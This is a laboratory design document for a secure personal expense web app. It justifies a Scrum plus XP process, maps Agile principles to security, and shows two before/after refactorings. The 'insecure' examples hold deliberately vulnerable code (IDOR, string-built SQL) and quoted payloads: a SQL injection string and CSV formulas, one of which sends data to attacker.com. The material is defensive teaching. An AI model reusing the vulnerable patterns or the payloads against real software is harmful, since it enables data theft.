# Phase 1: Agile Process and Development Approach

**Project Title:** Secure Personal Expense Management Application  
**Document ID:** SPEMA-DOC-PH01  
**Course Code:** 24CYS401 – Secure Software Engineering Laboratory  
**Document Path:** `docs/phases/phase-01-agile.md`  
**Classification:** Laboratory Examination Artifact – High Integrity  
**Status:** Approved Baseline  

---

## 1. Executive Summary & Problem Context

The **Secure Personal Expense Management Application** is a specialized web application designed to manage confidential personal financial records, including income entries, expense tracking, categorized transactions, monthly summaries, search/filtering, and financial report generation.

### Primary Security Mandate
> **A user must NEVER be able to access, modify, search, or report on another user's financial records.**
> 
> This constraint must be enforced server-side at the service and data-access layer. Every protected operation must derive the authenticated user's identity strictly from the cryptographically verified session token. The system must **never trust a `user_id` supplied by the client** for authorization decisions.

Phase 1 establishes the Agile software development lifecycle model, maps the Agile Manifesto principles to our security context, identifies realistic proactive refactoring patterns, and defines mitigations for Agile risks within security-sensitive financial systems.

---

## 2. Agile Process Selection & Justification

### 2.1 Selected Approach: Hybrid Scrum with Extreme Programming (XP) Practices (Rugged Scrum)

The project selects **Scrum** as the project management framework hybridized with **Extreme Programming (XP)** engineering practices (often termed *Rugged Scrum* or *Security-Enhanced Scrum*).

```
+-----------------------------------------------------------------------------------+
|                           Rugged Scrum Development Model                          |
+-----------------------------------------------------------------------------------+
|  Scrum Project Governance Cadence:                                                |
|  - 2-Week Sprint Cadence                                                          |
|  - Sprint Planning with Threat Modeling (STRIDE)                                  |
|  - Daily Scrum with Security Blocker & SAST Triage                                |
|  - Sprint Review with Negative Security Verification                              |
|  - Sprint Retrospective with Security Debt & Defect Analysis                      |
+-----------------------------------------------------------------------------------+
                                         |
                                         v
+-----------------------------------------------------------------------------------+
|  XP Engineering Safeguards (Technical Quality & Security Core):                   |
|  - Test-Driven Development (TDD) with Negative Authorization Unit/Integration Tests|
|  - Pair Programming / Two-Person Rule on Authorization & Cryptographic Boundaries |
|  - Continuous Integration (CI) with Automated SAST, SCA, and Linter Quality Gates |
|  - Continuous Refactoring to eliminate architectural code smells & anti-patterns  |
|  - Strict Coding Standards (OWASP ASVS Level 2, PEP 8, Zero-Trust Tenancy Pattern)|
+-----------------------------------------------------------------------------------+
```

### 2.2 Justification for a Security-Sensitive Financial Application

1. **Why Pure Scrum is Insufficient:**  
   Standard Scrum is a project management wrapper that intentionally leaves technical engineering practices unspecified. In a security-critical financial system, managing velocity without mandatory engineering safeguards results in high vulnerability density (e.g., missed IDOR vulnerabilities, SQL injection, hardcoded secrets, and missing tenant authorization checks).

2. **Why Pure Waterfall is Incompatible:**  
   Waterfall defers security testing to a late "Verification/Audit Phase." If broken object-level authorization (BOLA/IDOR) is detected at the end of the lifecycle, fixing it requires costly database schema redesign and widespread API changes.

3. **Why the Scrum + XP Hybrid is Superior:**
   - **TDD Enforces Zero-Trust Object Authorization:** XP's Test-Driven Development mandates writing tests before implementation. In our context, developers write **negative authorization tests** (e.g., verifying that User B receives `404 Not Found` when requesting User A's transaction) before writing the route handler or query.
   - **Pair Programming Protects Security Boundaries:** Trust-boundary code—such as JWT token extraction, session management, password hashing (Argon2/bcrypt), and report generation—is authored or reviewed using XP pair programming, preventing backdoors and accidental authorization bypasses.
   - **Continuous Refactoring Mitigates Security Debt:** As transaction query requirements expand (adding filters, categories, date ranges), continuous refactoring ensures that tenant filtering (`user_id == current_user.id`) remains centralized in the repository/data-access layer rather than fragmented across route controllers.
   - **Automated CI Security Quality Gates:** XP's continuous integration ensures that SAST (Bandit), secret scanners, and dependency linters run on every commit, preventing vulnerable code from ever reaching the main branch.

---

## 3. Agile Manifesto Mapping to the Project

Below is the formal mapping of the Agile Manifesto principles to the Secure Personal Expense Management Application.

### Principle 1: Early and Continuous Delivery of Valuable Software
- **Agile Principle:**  
  *"Our highest priority is to satisfy the customer through early and continuous delivery of valuable software."*
- **How it Applies to this Project:**  
  The system is built and released in functional, testable increments (Authentication → Transaction Logging → Categorization & Summaries → Secure Reporting) rather than waiting for an all-at-once final deliverable.
- **Practical Example:**  
  At the end of Sprint 1, an end-to-end containerized slice is delivered where a user can securely register, log in, create income/expense transactions, and verify that transactions are strictly isolated to their own account.
- **Security Implication:**  
  Early delivery allows early execution of dynamic penetration testing, fuzzing, and tenant isolation validation against a live, running container rather than delaying security verification to the end of the project.

---

### Principle 2: Welcome Changing Requirements
- **Agile Principle:**  
  *"Welcome changing requirements, even late in development. Agile processes harness change for the customer's competitive advantage."*
- **How it Applies to this Project:**  
  Financial security standards and threat landscapes evolve rapidly (e.g., new password hashing standards, updated OWASP Top 10 guidelines, or newly identified CSV injection vectors). The software architecture must accommodate updated security constraints without requiring a complete rewrite.
- **Practical Example:**  
  If the security specification is updated to enforce strict rate limiting on login attempts (e.g., 5 failed attempts per IP/username per 15 minutes) or requires adding formula-neutralization to CSV report exports, the modular architecture allows inserting these controls seamlessly.
- **Security Implication:**  
  Enables continuous security posture improvement. However, any requirement change must be accompanied by an updated threat model and regression test suite to ensure existing authorization boundaries remain unbroken.

---

### Principle 3: Frequent Delivery of Working Software
- **Agile Principle:**  
  *"Deliver working software frequently, from a couple of weeks to a couple of months, with a preference to the shorter timescale."*
- **How it Applies to this Project:**  
  Development is partitioned into two 2-week laboratory sprints. Each sprint produces a fully functional, containerized build deployed on Minikube/Kubernetes.
- **Practical Example:**  
  Sprint 1 delivers core authenticated multi-tenant transaction management. Sprint 2 delivers monthly summaries, advanced search/filter, secure CSV/PDF reports, and audit logging.
- **Security Implication:**  
  In a security-sensitive context, "working software" means software that is both functionally complete **and** cryptographically/authoritatively verified. Frequent delivery prevents the accumulation of uninspected code.

---

### Principle 4: Daily Collaboration Between Stakeholders and Developers
- **Agile Principle:**  
  *"Business people and developers must work together daily throughout the project."*
- **How it Applies to this Project:**  
  Financial business requirements (e.g., currency precision, income vs. expense accounting rules, category taxonomies) must directly align with technical security controls (e.g., audit trail immutability, data retention policies).
- **Practical Example:**  
  During daily standups and backlog refinement, the Product Owner (acting as financial/security compliance lead) clarifies that deleted transactions must be soft-deleted or recorded in an immutable audit log to preserve accounting integrity.
- **Security Implication:**  
  Prevents security-relevant functional misunderstandings. Ambiguities regarding who is permitted to access a record or report are resolved immediately, preventing flawed authorization assumptions from being coded into the software.

---

### Principle 5: Continuous Attention to Technical Excellence and Good Design
- **Agile Principle:**  
  *"Continuous attention to technical excellence and good design enhances agility."*
- **How it Applies to this Project:**  
  Clean code, strong architectural separation (Controller-Service-Repository), type safety, and centralized security primitives prevent defects from multiplying as the codebase expands.
- **Practical Example:**  
  Centralizing authorization logic into a single dependency (`Depends(get_current_active_user)`) and enforcing tenant scoping inside the repository layer ensures that every new transaction query automatically inherits tenant isolation without relying on individual developers remembering to write `WHERE user_id = ...`.
- **Security Implication:**  
  Technical excellence is the primary defense against security regression. Well-structured code enables automated SAST tools (e.g., Bandit) to achieve high precision and low false-positive rates, while eliminating architectural vulnerabilities such as SQL injection and IDOR by design.

---

### Principle 6: Working Software as the Primary Measure of Progress
- **Agile Principle:**  
  *"Working software is the primary measure of progress."*
- **How it Applies to this Project:**  
  Progress is measured solely by passing functional and security tests on running builds, not by written documentation or lines of unverified code.
- **Practical Example:**  
  A feature for "Monthly Financial Summary" is only counted toward sprint velocity when its unit tests pass, its negative IDOR test passes (confirming User B cannot view User A's monthly total), and static analysis detects zero high-severity flaws.
- **Security Implication:**  
  Redefines the definition of "working": software that leaks data or fails authorization is broken software, regardless of whether its user interface displays calculations correctly.

---

## 4. Realistic Refactoring Opportunities

Refactoring is applied proactively to eliminate code smells and architectural vulnerabilities before they cause security failures in production.

---

### 4.1 Refactoring Opportunity 1: Elimination of Broken Object-Level Authorization (BOLA / IDOR) and Client-Supplied `user_id`

#### Initial Design / Code Structure (Insecure Anti-Pattern)
In an early prototype, the transaction retrieval and update endpoints accept a `transaction_id` and a `user_id` directly from the client request (as route parameters or request body fields). The query retrieves the record by primary key without verifying ownership against the authenticated session:

```python
# INITIAL INSECURE DESIGN (Anti-Pattern)
@router.get("/transactions/{transaction_id}")
def get_transaction(transaction_id: int, user_id: int, db: Session = Depends(get_db)):
    # Vulnerability: Trusts user_id from client query parameter
    # Vulnerability: Direct lookup by PK alone
    transaction = db.query(Transaction).filter(Transaction.id == transaction_id).first()
    if not transaction:
        raise HTTPException(status_code=404, detail="Transaction not found")
    
    # Flaw: Even if a check exists (e.g. if transaction.user_id != user_id),
    # the client controls user_id, permitting cross-user IDOR spoofing.
    return transaction
```

#### Problem Identified
1. **Broken Object-Level Authorization (IDOR / BOLA - OWASP API1:2023):** Any authenticated user can modify the `transaction_id` parameter to inspect or alter any other user's confidential financial records.
2. **Untrusted Client Identity:** The server trusts a `user_id` supplied in the request parameter rather than verifying the caller's identity via cryptographic session state.
3. **Information Disclosure:** If the system returns `403 Forbidden` when the record exists but belongs to another user, an attacker can enumerate which transaction IDs exist across the platform.

#### Refactoring Strategy
1. Remove all client-supplied `user_id` parameters from request paths, query strings, and body schemas.
2. Derive user identity exclusively from the validated session/JWT token via dependency injection (`current_user = Depends(get_current_active_user)`).
3. Push ownership enforcement into the data-access layer by applying a **compound query filter** (`WHERE id = :txn_id AND user_id = :current_user_id`).
4. Return a generic `404 Not Found` if no matching record is found within that user's partition, completely concealing the existence of other users' records.

#### Improved Structure
```python
# REFACTORED SECURE STRUCTURE
@router.get("/transactions/{transaction_id}", response_model=TransactionResponse)
def get_transaction(
    transaction_id: int = Path(..., ge=1, description="Unique transaction ID"),
    current_user: User = Depends(get_current_active_user),  # Server-derived identity
    db: Session = Depends(get_db)
):
    # Compound authorization filter at the data-access boundary
    transaction = db.query(Transaction).filter(
        Transaction.id == transaction_id,
        Transaction.user_id == current_user.id  # Strict tenant isolation
    ).first()
    
    if not transaction:
        # Uniform 404 response prevents ID enumeration
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail="Transaction not found"
        )
    return transaction
```

#### Security & Maintainability Benefit
- **Zero-Trust Input Architecture:** The client has no mechanism to request records on behalf of any identity other than its own cryptographically verified session.
- **Elimination of BOLA/IDOR:** Compound database query ensures the SQL engine physically restricts row retrieval to the caller's tenancy partition.
- **Anti-Enumeration Defense:** Generic `404 Not Found` response prevents attackers from probing which integer transaction IDs exist in the database.

---

### 4.2 Refactoring Opportunity 2: Elimination of SQL Injection and CSV Formula Injection in Search & Financial Reporting

#### Initial Design / Code Structure (Insecure Anti-Pattern)
During rapid early development, dynamic filtering for transaction descriptions and categories is implemented via raw SQL string concatenation. Furthermore, CSV report export is implemented by directly concatenating raw database fields into a comma-separated text stream:

```python
# INITIAL INSECURE DESIGN (Anti-Pattern)
@router.get("/reports/export-csv")
def export_report_vulnerable(keyword: str, user_id: int, db: Session = Depends(get_db)):
    # Vulnerability 1: SQL Injection via string formatting
    query = f"SELECT id, amount, category, description FROM transactions WHERE user_id = {user_id} AND description LIKE '%{keyword}%'"
    rows = db.execute(text(query)).fetchall()

    # Vulnerability 2: CSV Formula Injection (CWE-1236)
    csv_data = "ID,Amount,Category,Description\n"
    for r in rows:
        csv_data += f"{r.id},{r.amount},{r.category},{r.description}\n"
        
    return Response(content=csv_data, media_type="text/csv")
```

#### Problem Identified
1. **SQL Injection (CWE-89 / OWASP A03:2021):** An attacker can pass `' OR '1'='1` in the `keyword` parameter to bypass tenant isolation and dump the entire transaction database.
2. **CSV Formula Injection / Spreadsheet Injection (CWE-1236):** If a user creates an expense with a description such as `=cmd|' /C calc'!A0` or `=HYPERLINK("http://attacker.com/leak?data="&A1)`, spreadsheet software (e.g., Microsoft Excel, LibreOffice Calc) will execute the payload or exfiltrate data when an administrator or user opens the exported report.
3. **BOLA/IDOR in Reporting:** The report generation accepts a client-supplied `user_id`.

#### Refactoring Strategy
1. Replace raw SQL strings with parameterized SQLAlchemy ORM queries and Pydantic schema validation.
2. Derive user identity strictly from `current_user.id`.
3. Introduce a dedicated `SecureCSVExporter` that inspects every exported cell. If any cell starts with a spreadsheet formula trigger character (`=`, `+`, `-`, `@`, `\t`, `\r`), it prepends a single quotation mark (`'`), sanitizes quotes, and enforces RFC 4180 quoting.

#### Improved Structure
```python
# REFACTORED SECURE STRUCTURE
import csv
import io
from fastapi.responses import StreamingResponse

FORMULA_TRIGGERS = ('=', '+', '-', '@', '\t', '\r')

def sanitize_csv_field(value: any) -> str:
    """Neutralize spreadsheet formula injection (CWE-1236)."""
    if value is None:
        return ""
    text_val = str(value)
    # Neutralize dangerous formula execution triggers
    if text_val.startswith(FORMULA_TRIGGERS):
        return f"'{text_val}"
    return text_val

@router.get("/reports/export-csv")
def export_report_secure(
    keyword: Optional[str] = Query(None, max_length=100, regex=r"^[a-zA-Z0-9_\-\s]*$"),
    current_user: User = Depends(get_current_active_user),
    db: Session = Depends(get_db)
):
    # Parameterized ORM query enforcing tenant scope
    query = db.query(Transaction).filter(Transaction.user_id == current_user.id)
    if keyword:
        # Parameterized ILIKE clause prevents SQL injection
        query = query.filter(Transaction.description.ilike(f"%{keyword}%"))
    
    records = query.order_by(Transaction.transaction_date.desc()).all()

    output = io.StringIO()
    writer = csv.writer(output, quoting=csv.QUOTE_ALL)
    writer.writerow(["Date", "Type", "Category", "Amount", "Description"])

    for item in records:
        writer.writerow([
            item.transaction_date.strftime("%Y-%m-%d"),
            sanitize_csv_field(item.type),
            sanitize_csv_field(item.category),
            f"{item.amount:.2f}",
            sanitize_csv_field(item.description)
        ])

    output.seek(0)
    return StreamingResponse(
        iter([output.getvalue()]),
        media_type="text/csv",
        headers={"Content-Disposition": "attachment; filename=personal_expense_report.csv"}
    )
```

#### Security & Maintainability Benefit
- **SQLi Immunity:** Parameterized execution guarantees input cannot escape data context.
- **Formula Injection Immunity:** Neutralizes CWE-1236, ensuring spreadsheet clients treat descriptions purely as passive text literals.
- **Strict Tenant Enclosure:** The exported dataset is strictly scoped to `current_user.id`, preventing cross-account financial leaks.

---

## 5. Agile Limitations and Risks for Security-Sensitive Systems & Mitigations

While Agile facilitates fast delivery, applying it to high-assurance financial applications introduces distinct risks that must be systematically managed.

| # | Agile Risk / Limitation | Why it Matters (Impact on Financial App) | Concrete Engineering Mitigation |
| :-: | :--- | :--- | :--- |
| **1** | **Velocity Bias & Accumulation of Security Debt** *(Feature-First Bias)* | Agile burn-down charts track user story points. Teams are incentivized to prioritize visible functional stories (e.g., UI charts, new transaction categories) over non-functional security controls (e.g., rate limiting, token revocation, audit logging, input sanitization). This creates hidden **Security Debt**, leading to vulnerabilities that are costly to remediate late in development. | **1. Security-Enhanced Definition of Done (DoD):** No user story is marked "Done" unless it includes automated negative authorization tests, passes SAST checks with zero high/critical issues, and adheres to OWASP guidelines.<br>**2. Evil User Stories (Abuser Stories):** Security requirements are scheduled as first-class backlog items (e.g., *"As an attacker, I want to access User B's report via IDOR so that I can steal their financial balance"*), with dedicated story points.<br>**3. Security Capacity Allocation:** 20% of every sprint's velocity is reserved exclusively for security refactoring, dependency updates, and hardening. |
| **2** | **Emergent Architecture Leading to Inconsistent Trust Boundaries** *(Fragmented Security Controls)* | Agile encourages architecture to "emerge" incrementally. Without an upfront baseline, individual developers implement authorization checks ad-hoc across separate controllers. One endpoint might check ownership properly, while an export endpoint or summary endpoint omits it, creating severe IDOR/BOLA loopholes. | **1. Sprint 0 Architectural Threat Modeling:** Conduct a preliminary STRIDE analysis before sprint 1 to define immutable architectural invariants (e.g., centralized tenant extraction middleware, compound repository query patterns).<br>**2. Architectural Invariant Enforcement:** Encapsulate database access in an isolated repository layer where every query method takes an explicit `tenant_id` derived from the session.<br>**3. Triggered Security Delta Reviews:** Any sprint task that modifies authentication, authorization, session state, or report generation triggers a mandatory security peer review before merge. |

---

## 6. Phase 1 Laboratory Artifact Summary

### 6.1 Artifacts Created
- **Document:** `docs/phases/phase-01-agile.md`
- **Scope:** Agile process selection (Scrum + XP), Agile Manifesto mappings (6 principles with project applications, practical examples, and security implications), 2 detailed refactoring opportunities with before/after code structures and security justifications, and 2 core Agile risks with concrete mitigations.

### 6.2 Traceability Links
- **Upstream:** Laboratory Problem Statement (Secure Personal Expense Management Application).
- **Downstream:** 
  - Phase 2 (Requirements Engineering) will ingest the security invariants and Agile roles established here.
  - Phase 9 & 10 (Product Backlog & Scrum Metrics) will utilize the 2-sprint cadence, DoD criteria, and Evil User Stories defined here.
  - Phase 11 & 12 (Secure Build & Refactoring) will physically execute the TDD negative testing suites and refactored code patterns specified in Section 4.

---

## 7. Consistency and Security Sanity Check

- [x] **Primary Security Mandate Verified:** The refactoring and architectural rules strictly enforce that `user_id` is derived server-side from authenticated session tokens and is never trusted from client input.
- [x] **Realistic Architecture:** Uses standard, robust, lab-appropriate components (FastAPI, SQLAlchemy, Pydantic, SQLite/PostgreSQL) without unnecessary third-party framework overhead.
- [x] **Strict Phase Boundary Respected:** No application code has been implemented; no Jira issues have been created; Phase 2 requirements engineering has not been started.
